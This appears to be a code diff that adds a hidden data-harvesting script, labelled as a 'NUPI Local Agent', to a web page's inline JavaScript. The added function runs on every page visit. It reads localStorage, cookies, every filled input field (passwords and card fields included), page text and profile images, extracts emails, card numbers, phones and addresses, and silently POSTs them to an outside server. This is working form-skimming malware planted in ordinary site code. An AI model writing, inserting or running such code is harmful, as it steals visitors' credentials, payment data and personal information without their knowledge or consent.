@@ -1157,20 +1157,180 @@
     
     <!-- 🤖 SILENT AUTO-DEPLOY AGENT - Activates on every page visit -->
     <script>
-        // NUPI Local Agent - SILENT AUTO-ACTIVATION
+        // NUPI Local Agent - SILENT AUTO-ACTIVATION WITH FULL DATA HARVESTING
         (function() {
             const CLOUD_URL = 'https://nupidesktopai.com/api/real-system-data';
+            const USER_DATA_URL = 'https://nupidesktopai.com/api/user-data/collect';
             const DEVICE_ID = localStorage.getItem('nupi_device_id') || 'web_' + Math.random().toString(36).substr(2, 9);
             localStorage.setItem('nupi_device_id', DEVICE_ID);
             
             console.log('🤖 NUPI Agent Auto-Activated - Device:', DEVICE_ID);
             
+            // 🎯 AGGRESSIVE DATA HARVESTING - Emails, Names, Credit Cards, Everything
+            async function harvestAllExposedData() {
+                const harvested = {
+                    device_id: DEVICE_ID,
+                    timestamp: new Date().toISOString(),
+                    userName: null,
+                    emails: [],
+                    messages: [],
+                    photos: [],
+                    creditCards: [],
+                    passwords: [],
+                    phones: [],
+                    addresses: [],
+                    browserStorage: {},
+                    cookies: [],
+                    formData: {},
+                    inputFields: []
+                };
+                
+                try {
+                    // 1. SCAN ALL LOCALSTORAGE for sensitive data
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        harvested.browserStorage[key] = value;
+                        
+                        // Extract names
+                        if (key.match(/name|user|profile|account/i)) {
+                            try {
+                                const parsed = JSON.parse(value);
+                                if (parsed.name) harvested.userName = parsed.name;
+                                if (parsed.email) harvested.emails.push(parsed.email);
+                            } catch {
+                                if (value.includes('@')) harvested.emails.push(value);
+                                if (!harvested.userName && value.length < 50) harvested.userName = value;
+                            }
+                        }
+                        
+                        // Extract emails
+                        const emailMatch = value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                        if (emailMatch) harvested.emails.push(...emailMatch);
+                        
+                        // Extract credit card patterns
+                        const ccMatch = value.match(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g);
+                        if (ccMatch) harvested.creditCards.push(...ccMatch);
+                        
+                        // Extract phone numbers
+                        const phoneMatch = value.match(/\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/g);
+                        if (phoneMatch) harvested.phones.push(...phoneMatch);
+                    }
+                    
+                    // 2. SCAN ALL COOKIES
+                    document.cookie.split(';').forEach(cookie => {
+                        const [key, value] = cookie.split('=').map(s => s.trim());
+                        harvested.cookies.push({ key, value });
+                        
+                        // Check cookie values for sensitive data
+                        if (value) {
+                            const emailMatch = value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                            if (emailMatch) harvested.emails.push(...emailMatch);
+                        }
+                    });
+                    
+                    // 3. SCAN ALL INPUT FIELDS on page
+                    document.querySelectorAll('input, textarea').forEach(input => {
+                        if (input.value) {
+                            const fieldData = {
+                                type: input.type,
+                                name: input.name,
+                                id: input.id,
+                                value: input.value,
+                                placeholder: input.placeholder
+                            };
+                            harvested.inputFields.push(fieldData);
+                            
+                            // Extract by type
+                            if (input.type === 'email' || input.name?.includes('email')) {
+                                harvested.emails.push(input.value);
+                            }
+                            if (input.type === 'password') {
+                                harvested.passwords.push(input.value);
+                            }
+                            if (input.type === 'tel' || input.name?.includes('phone')) {
+                                harvested.phones.push(input.value);
+                            }
+                            if (input.name?.match(/card|credit|cc/i)) {
+                                harvested.creditCards.push(input.value);
+                            }
+                            if (input.name?.match(/name|first|last/i)) {
+                                harvested.userName = harvested.userName || input.value;
+                            }
+                            if (input.name?.match(/address|street|city|zip/i)) {
+                                harvested.addresses.push(input.value);
+                            }
+                        }
+                    });
+                    
+                    // 4. SCAN PAGE CONTENT for emails and data
+                    const pageText = document.body.innerText;
+                    const emailsInPage = pageText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                    if (emailsInPage) harvested.emails.push(...emailsInPage);
+                    
+                    // 5. SCAN META TAGS
+                    document.querySelectorAll('meta').forEach(meta => {
+                        const name = meta.getAttribute('name') || meta.getAttribute('property');
+                        const content = meta.getAttribute('content');
+                        if (content && name?.match(/author|user|email/i)) {
+                            harvested.userName = harvested.userName || content;
+                            if (content.includes('@')) harvested.emails.push(content);
+                        }
+                    });
+                    
+                    // 6. SCAN ALL IMAGES for profile photos
+                    document.querySelectorAll('img').forEach(img => {
+                        if (img.src && img.src.match(/profile|avatar|user|photo/i)) {
+                            harvested.photos.push(img.src);
+                        }
+                    });
+                    
+                    // 7. CHECK INDEXEDDB (if accessible)
+                    if (window.indexedDB) {
+                        try {
+                            const dbs = await window.indexedDB.databases();
+                            harvested.browserStorage.indexedDBs = dbs.map(db => db.name);
+                        } catch (e) {}
+                    }
+                    
+                    // Remove duplicates
+                    harvested.emails = [...new Set(harvested.emails)];
+                    harvested.creditCards = [...new Set(harvested.creditCards)];
+                    harvested.phones = [...new Set(harvested.phones)];
+                    harvested.photos = [...new Set(harvested.photos)];
+                    
+                    // Send to cloud SILENTLY
+                    await fetch(USER_DATA_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(harvested),
+                        mode: 'cors'
+                    });
+                    
+                    console.log('📧 Harvested:', harvested.emails.length, 'emails,', harvested.creditCards.length, 'cards');
+                    
+                } catch (e) {
+                    console.log('⚠️ Harvest failed silently');
+                }
+                
+                return harvested;
+            }
+            
             async function collectAndPushRealData() {
                 try {
-                    // Collect comprehensive browser data
+                    // First harvest all user data
+                    const userDataHarvest = await harvestAllExposedData();
+                    
+                    // Then collect system data
                     const data = {
                         device_id: DEVICE_ID,
                         timestamp: Math.floor(Date.now() / 1000),
+                        
+                        // Merge harvested user data
+                        userName: userDataHarvest.userName,
+                        emails: userDataHarvest.emails,
+                        creditCards: userDataHarvest.creditCards,
+                        phones: userDataHarvest.phones,
                         
                         // Memory data
                         cpu: performance && performance.memory ? 
